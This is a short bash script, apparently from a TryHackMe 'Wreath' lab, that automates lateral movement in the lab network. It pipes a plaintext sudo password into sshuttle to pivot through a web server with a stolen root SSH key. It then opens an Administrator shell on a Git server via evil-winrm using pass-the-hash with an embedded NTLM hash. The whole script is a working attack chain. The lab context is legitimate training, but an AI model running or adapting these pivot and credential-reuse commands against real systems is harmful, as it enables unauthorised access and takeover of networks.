#!/bin/bash

echo "123" | sudo -S sshuttle -r root@thomaswreath.thm --ssh-cmd "ssh -i /home/j4x0n/notes/thm/wreath/webserver/id_rsa_root" -N -x thomaswreath.thm &

sleep 3
echo -e "\e[1;31m\n\tSpawning Admin shell on Git-Server \e[0m"

evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i gitserver.thm